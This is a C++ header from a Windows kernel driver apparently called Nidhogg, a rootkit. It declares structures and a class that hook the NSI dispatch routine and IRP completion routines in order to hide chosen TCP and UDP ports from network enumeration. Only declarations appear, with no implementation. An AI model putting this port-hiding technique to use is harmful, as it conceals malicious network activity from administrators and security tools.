#pragma once
#include "pch.h"
#include "MemoryHelper.hpp"

extern "C" {
	#include "WindowsTypes.hpp"
	#include "NidhoggCommon.h"
}

constexpr USHORT MAX_PORT_NUMBER = 65535;
constexpr USHORT MAX_PORTS = 256;
constexpr ULONG IOCTL_NSI_ENUMERATE_OBJECTS_ALL_PARAMETERS = 0x12001B;

constexpr USHORT htohs(USHORT port) { return (((port >> 8) & 0x00FF) | ((port << 8) & 0xFF00)); }

enum class PortType {
	TCP,
	UDP
};

struct InputHiddenPort {
	bool Hide;
	bool Remote;
	PortType Type;
	USHORT Port;
};

struct HiddenPort {
	bool Remote;
	PortType Type;
	USHORT Port;
};

struct OutputHiddenPorts {
	HiddenPort Ports[MAX_PORTS];
	USHORT PortsCount;
};

struct HiddenPorts {
	FastMutex Lock;
	HiddenPort Ports[MAX_PORTS];
	USHORT LastIndex;
	USHORT PortsCount;
};

struct HookedCompletionRoutine {
	PIO_COMPLETION_ROUTINE OriginalCompletionRoutine;
	PVOID OriginalContext;
};

NTSTATUS NsiIrpComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);
NTSTATUS HookedNsiDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp);

class NetworkUtils
{
private:
	bool CallbackActivated;
	HiddenPorts HiddenPortsList;
	PVOID OriginalNsiDispatchAddress;

public:
	void* operator new(size_t size) {
		return AllocateMemory(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	NetworkUtils();
	~NetworkUtils();

	NTSTATUS InstallNsiHook();
	NTSTATUS UninstallNsiHook();
	bool FindHiddenPort(HiddenPort port);
	bool AddHiddenPort(HiddenPort port);
	bool RemoveHiddenPort(HiddenPort port);
	void ClearHiddenPortsList();
	void QueryHiddenPorts(OutputHiddenPorts* outputHiddenPorts);

	USHORT GetPortsCount() { return this->HiddenPortsList.PortsCount; }
	bool IsCallbackActivated() { return this->CallbackActivated; }
	PVOID GetOriginalCallback() { return this->OriginalNsiDispatchAddress; }
};

inline NetworkUtils* NidhoggNetworkUtils;

